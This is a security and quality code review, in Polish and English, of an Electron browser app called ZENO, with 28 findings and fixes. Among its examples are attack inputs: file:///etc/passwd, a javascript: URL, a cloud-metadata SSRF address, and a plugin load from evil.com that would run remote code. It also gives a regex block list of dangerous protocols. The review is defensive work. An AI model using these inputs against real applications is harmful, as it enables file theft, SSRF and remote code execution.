
# CODE REVIEW: ZENO Browser — Security, Performance, Best Practices

## EXECUTIVE SUMMARY

| Severity | Count |
|----------|-------|
| 🔴 **CRITICAL** | 6 |
| 🟠 **HIGH** | 8 |
| 🟡 **MEDIUM** | 9 |
| 🟢 **LOW** | 5 |
| **TOTAL** | **28 issues** |

---

## 🔴 CRITICAL ISSUES (napraw NATYCHMIAST)

### CR-001: Brak walidacji URL w `browser:navigate` IPC → Open Redirect / Internal Network Access
- **Pliki:** main.ts L141-143, browser-manager.ts L64-72
- **Problem:** `browser:navigate` IPC handler przyjmuje **dowolny URL** bez walidacji i przekazuje go do `browserManager.navigate()`. Renderer może nakazać nawigację do:
  - `file:///etc/passwd` — odczyt plików lokalnych 
  - `javascript:alert(1)` — XSS w kontekście strony
  - `http://169.254.169.254/` — SSRF do cloud metadata (AWS/GCP)
  - `http://localhost:3000/` — dostęp do wewnętrznych serwisów
- **Fix:**
  ```typescript
  // browser-manager.ts → navigate()
  navigate(tabId: string, url: string): boolean {
    const tab = this.tabs.get(tabId);
    if (!tab) return false;
    
    // SECURITY: Validate URL protocol
    const allowedProtocols = ['http:', 'https:', 'about:'];
    try {
      const parsed = new URL(url);
      if (!allowedProtocols.includes(parsed.protocol)) {
        console.warn(`⚠️ Blocked navigation to: ${url}`);
        return false;
      }
    } catch {
      return false; // Invalid URL
    }
    
    tab.url = url;
    tab.lastAccessedAt = new Date();
    return true;
  }
  ```

### CR-002: `plugin:load` IPC akceptuje dowolny source path → Arbitrary Code Execution
- **Plik:** plugin-ipc-bridge.ts L16-22
- **Problem:** `plugin:load` handler przyjmuje `source: string` bezpośrednio od renderera i ładuje plugin z dowolnej lokalizacji — **pliku lokalnego lub URL**. Złośliwa strona w WebView mogłaby wywołać `electronAPI.plugin.load('http://evil.com/malware.js')`.
- **Powiązanie:** plugin-loader.ts wykonuje `new Function(code)` lub `eval(code)` w `executeUnsafe()` — **pełne RCE**.
- **Fix:** Whitelist dozwolonych source directories, weryfikacja integrity (hash), wymuś sandbox.

### CR-003: Plugin Loader używa `eval()` i `new Function()` → Remote Code Execution
- **Plik:** plugin-loader.ts L82-100
- **Problem:** 
  ```typescript
  // L93: executeSandboxed() - new Function() to NIE jest sandbox
  const fn = new Function('BasePlugin', `"use strict"; ${code} ...`);
  
  // L103: executeUnsafe() - dosłowne eval()
  return eval(`(function() { ${code}; ... })()`);
  ```
  `new Function()` **NIE jest sandboxem** — ma pełny dostęp do `globalThis`, `process`, `require`. Nazwa metody "sandboxed" jest **myląca i niebezpieczna**.
- **Fix:** Użyj `vm.runInNewContext()` z Node.js, lub `isolated-vm` package dla prawdziwej izolacji. Lub ogranicz ładowanie pluginów tylko do zweryfikowanych paczek.

### CR-004: browser-sandbox.ts w services importuje `ipcMain` — kod main procesu w folderze renderera
- **Plik:** browser-sandbox.ts L6
- **Problem:** Importuje `{ ipcMain, contextBridge } from 'electron'` — to API dostępne **WYŁĄCZNIE w main process**. Plik jest w services (renderer bundle). W Vite build ten plik albo crashuje, albo jest dead code.
- **Duplikacja:** W security-sandbox.ts istnieje **inna implementacja** tego samego. Dwa pliki = splitted security logic.
- **Fix:** Usuń browser-sandbox.ts. Cała logika security sandbox jest już w security-sandbox.ts.

### CR-005: Brak Content Security Policy (CSP)
- **Plik:** main.ts L32-42
- **Problem:** `BrowserWindow` nie ustawia **żadnego CSP**. W dev mode ładuje `http://localhost:5173` — zero ochrony przed XSS.
- **Fix:**
  ```typescript
  // main.ts → after mainWindow.loadURL()
  mainWindow.webContents.session.webRequest.onHeadersReceived((details, callback) => {
    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Content-Security-Policy': [
          "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
        ]
      }
    });
  });
  ```

### CR-006: AddressBar auto-prepend `https://` bez walidacji → User-controlled URL injection
- **Plik:** AddressBar.tsx L28-32
- **Problem:**
  ```typescript
  if (!finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
    finalUrl = 'https://' + finalUrl;
  }
  ```
  Użytkownik wpisuje `javascript:void(0)` → nie zaczyna od `http` → staje się `https://javascript:void(0)` → niepoprawny URL, ale **nie jest blokowany**. Gorzej: `data:text/html,...` → `https://data:text/html,...` ale sam `http://evil` przechodzi bez zmian.
- **Fix:** Dodaj whitelist protokołów + walidację URL w AddressBar ORAZ w browser-manager (defense in depth):
  ```typescript
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    let finalUrl = input.trim();
    
    // Block dangerous protocols
    if (/^(javascript|data|vbscript|file):/i.test(finalUrl)) return;
    
    if (!/^https?:\/\//i.test(finalUrl)) {
      finalUrl = 'https://' + finalUrl;
    }
    
    try { new URL(finalUrl); } catch { return; } // Must be valid URL
    onNavigate(finalUrl);
  };
  ```

---

## 🟠 HIGH ISSUES

### CR-007: API keys w `process.env` bez weryfikacji → Crash na undefined
- **Pliki:** index.ts L12-33
- **Problem:** `apiKey: process.env.DEEPSEEK_API_KEY || ''` — pusty string oznacza enabled provider który crashuje na auth error przy pierwszym request.
- **Fix:** Waliduj przy starcie: `enabled: !!process.env.DEEPSEEK_API_KEY?.trim()`

### CR-008: gateway.ts require() dynamiczny — brakujące moduły → Runtime crash
- **Plik:** gateway.ts L55-62
- **Problem:** `require('./providers/openai').OpenAIProvider` — plik `providers/openai.ts` **nie istnieje**. Runtime `MODULE_NOT_FOUND` error.
- **Fix:** Usuń phantom providers (openai, anthropic, local) lub utwórz pliki.

### CR-009: `PluginExplorer` importuje `marketplaceService` bezpośrednio — bypasses IPC boundary
- **Plik:** PluginExplorer.tsx L3
- **Problem:** `import { marketplaceService } from '../plugin-system/marketplace/marketplace-service'` — renderer importuje service który wykonuje HTTP requesty. Powinno iść przez IPC (contextBridge).
- **Konsekwencja:** Narusza Electron security model. Service ma `axios` instance z `baseURL` do marketplace — w renderer to CORS issue.
- **Fix:** Użyj `window.electronAPI.plugin.searchMarketplace()` (IPC handler już istnieje w `plugin-ipc-bridge.ts` L69-77).

### CR-010: `tunnel:initialize` IPC akceptuje pełny TunnelConfig z renderera → config injection
- **Plik:** tunnel-ui-bridge.ts L38
- **Problem:** `ipcMain.handle('tunnel:initialize', async (_, config: TunnelConfig) => {...})` — renderer może podać **dowolny** `tunnelToken`, `accountId`, `routes`. Atakujący może redirectować ruch przez swój tunnel.
- **Fix:** Config powinien pochodzić z pliku konfiguracyjnego/env vars, nie z renderera.

### CR-011: `ipcMain.emit('update-progress', progress)` — niepoprawne użycie IPC
- **Plik:** auto-updater.ts L440 (download-progress handler)
- **Problem:** `ipcMain.emit()` wysyła event **w main process**, NIE do renderera. Renderer nigdy nie dostanie `update-progress`.
- **Fix:** `mainWindow.webContents.send('update-progress', progress)`

### CR-012: Brak input sanitization w AI execute → Prompt injection vector
- **Pliki:** main.ts L154-162, ai-gateway-service.ts
- **Problem:** `ai:execute` handler przekazuje `request: any` bez walidacji. Brak limitu na `prompt` length, `maxTokens`, `temperature` range.
- **Fix:** 
  ```typescript
  ipcMain.handle('ai:execute', async (_, request: unknown) => {
    if (!request || typeof request !== 'object') throw new Error('Invalid request');
    const { prompt, maxTokens = 2048, temperature = 0.7 } = request as AIRequest;
    if (typeof prompt !== 'string' || prompt.length > 50000) throw new Error('Invalid prompt');
    if (maxTokens > 8192) throw new Error('maxTokens too high');
    if (temperature < 0 || temperature > 2) throw new Error('Invalid temperature');
    // ...
  });
  ```

### CR-013: Preload exposes `process.platform`, `process.version` → Information disclosure
- **Plik:** preload.ts L49-53
- **Problem:**
  ```typescript
  system: {
    platform: process.platform,
    nodeVersion: process.version,
    arch: process.arch,
  }
  ```
  Udostępnia wersję Node.js i architekturę do renderera. Strony webowe mogą odczytać `window.electronAPI.system` i zidentyfikować podatne wersje.
- **Fix:** Usuń z preload lub ogranicz dostęp.

### CR-014: Cloudflare tunnel config pisze credentials do `$HOME/.cloudflared/` — path traversal risk
- **Plik:** cloudflare-tunnel.ts L208
- **Problem:** `process.env.HOME || '/root'` — na Windows `HOME` może nie istnieć. `fs.writeFileSync` z interpolowanymi wartościami z config (który może pochodzić z renderera — CR-010).
- **Fix:** Użyj `app.getPath('userData')` zamiast `HOME`. Waliduj config values.

---

## 🟡 MEDIUM ISSUES

### CR-015: Memory leak — brak cleanup event listenerów w CloudflareTunnelPanel
- **Plik:** CloudflareTunnelPanel.tsx L38-42
- **Problem:** `setInterval` w `useEffect` — cleanup jest OK gdy `autoRefresh` się zmienia, ale jeśli komponent unmountuje z `autoRefresh=false`, cleanup nie wywołuje `clearInterval` (return jest conditional).
- **Fix:** Zawsze zwracaj cleanup z useEffect.

### CR-016: Unbounded audit log growth
- **Plik:** security-sandbox.ts
- **Problem:** `maxLogs = 10000` ale logi przechowywane w pamięci. Przy intensywnym użyciu → memory pressure.
- **Fix:** Rotate do pliku, lub zmniejsz limit.

### CR-017: `confirm()` w PluginManager — blocking dialog w React app
- **Plik:** PluginManager.tsx L69
- **Problem:** `if (confirm('Are you sure...'))` — blokuje main thread, nie jest accessible (brak focus trap).
- **Fix:** Użyj modal component zamiast `window.confirm`.

### CR-018: Brak error boundary w UI
- **Pliki:** Cały components
- **Problem:** Żaden komponent nie ma Error Boundary. Niezłapany error w AIPanel lub PluginExplorer crashuje **cały UI**.
- **Fix:** Dodaj `<ErrorBoundary>` wokół floating panels i głównego content.

### CR-019: gateway.ts cache key based on truncated base64 → Hash collision risk
- **Plik:** gateway.ts L139-141
- **Problem:** `Buffer.from(request.prompt).toString('base64').substring(0, 20)` — obcina base64 do 20 znaków. Różne prompty mogą mieć ten sam cache key.
- **Fix:** Użyj `crypto.createHash('sha256').update(prompt).digest('hex').substring(0, 16)`.

### CR-020: Hardcoded marketplace URL z fallback na Cloudflare domain
- **Plik:** marketplace-service.ts L25
- **Problem:** `process.env.REACT_APP_MARKETPLACE_URL || 'https://marketplace.zeno-browser.io'` — hardcoded domain. Jeśli domena wygaśnie, atakujący może ją przejąć i serwować malicious plugins.
- **Fix:** Pin domain w kodzie + dodaj certificate pinning lub checksums.

### CR-021: `RateLimiter` class referenced but never defined
- **Plik:** gateway.ts L37
- **Problem:** `private rateLimiters: Map<string, RateLimiter>` — klasa `RateLimiter` nie jest zaimportowana ani zdefiniowana. TypeScript compile error (maskowany przez `any`).
- **Fix:** Zaimplementuj `RateLimiter` lub użyj istniejącej biblioteki.

### CR-022: `autoUpdater.logger = require('electron-log')` — niepotrzebny runtime require
- **Plik:** auto-updater.ts
- **Problem:** `require()` w ESM code, może nie być zainstalowane.
- **Fix:** Static `import log from 'electron-log'`.

### CR-023: Plugin IPC bridge importuje z `../../src/` — cross-boundary import
- **Plik:** plugin-ipc-bridge.ts L6-8
- **Problem:**
  ```typescript
  import { pluginManager } from '../../src/plugin-system/core/plugin-manager';
  import { marketplaceService } from '../../src/plugin-system/marketplace/marketplace-service';
  ```
  Main process importuje z src renderer bundle. Problemy z Vite build boundaries.
- **Fix:** Przenieś plugin-system/core do shared layer lub src-electron.

---

## 🟢 LOW ISSUES

### CR-024: Brak ARIA attributes i keyboard navigation
- **Pliki:** Wszystkie `src/components/*.tsx`
- **Problem:** Zero `aria-label`, `role`, `aria-live` attributes. Brak `tabIndex`, brak keyboard trap w modal (PluginInstaller).
- **Fix:** Dodaj `aria-label` do przycisków, `role="dialog"` do paneli, trap focus w modal.

### CR-025: Inconsistent naming — IPC channel names
- **Problem:** Preload używa `browser:new-tab`, ale niektóre komponenty mogą oczekiwać `browser:newTab`. Mismatch między preload a typami.
- **Fix:** Ujednolicij naming convention (kebab-case lub camelCase, nie mix).

### CR-026: `PluginInstaller` simulates progress z setTimeout — fake UX
- **Plik:** PluginInstaller.tsx L32-36
- **Problem:** Symulacja progressu instalacji `for (let i = 0; i <= 100; i += 10) { await setTimeout(200); }` — nie odzwierciedla rzeczywistego postępu.
- **Fix:** Użyj real progress z IPC callback lub usuń fake progress bar.

### CR-027: Dead code — `report` state w SecurityMonitor
- **Plik:** SecurityMonitor.tsx L11
- **Problem:** `const [report, setReport] = useState<any>(null)` — `setReport` nigdy nie jest wywoływane. Dead state.
- **Fix:** Usuń.

### CR-028: Zustand w dependencies ale nieużywany
- **Plik:** package.json
- **Problem:** `zustand: ^4.4.1` w deps, 0 stores w kodzie.
- **Fix:** `npm uninstall zustand`.

---

## PODSUMOWANIE — MATRYCA RYZYKA

```
                    IMPACT
              Low    Medium    High    Critical
         ┌─────────┬─────────┬────────┬──────────┐
  Easy   │ CR-027  │ CR-017  │ CR-007 │ CR-004   │
  to     │ CR-028  │ CR-022  │ CR-008 │ CR-005   │
  Fix    │         │ CR-025  │ CR-013 │ CR-006   │
         ├─────────┼─────────┼────────┼──────────┤
  Medium │ CR-024  │ CR-015  │ CR-009 │ CR-001   │
  Effort │ CR-026  │ CR-016  │ CR-011 │ CR-010   │
         │         │ CR-019  │ CR-012 │ CR-002   │
         │         │ CR-021  │ CR-014 │          │
         │         │ CR-023  │        │          │
         ├─────────┼─────────┼────────┼──────────┤
  Hard   │         │ CR-020  │        │ CR-003   │
  to Fix │         │ CR-018  │        │          │
         └─────────┴─────────┴────────┴──────────┘
```

## KOLEJNOŚĆ NAPRAWY (rekomendowana)

| Priority | Issues | Dlaczego |
|----------|--------|----------|
| **P0 — TERAZ** | CR-001, CR-002, CR-003 | RCE + SSRF — krytyczne security holes |
| **P1 — Przed release** | CR-004, CR-005, CR-006, CR-010 | XSS + URL injection + config injection |
| **P2 — Przy upgrade** | CR-007, CR-008, CR-009, CR-011, CR-012 | Popraw przy okazji refactoru |
| **P3 — Backlog** | CR-013..CR-028 | Quality, performance, accessibility |

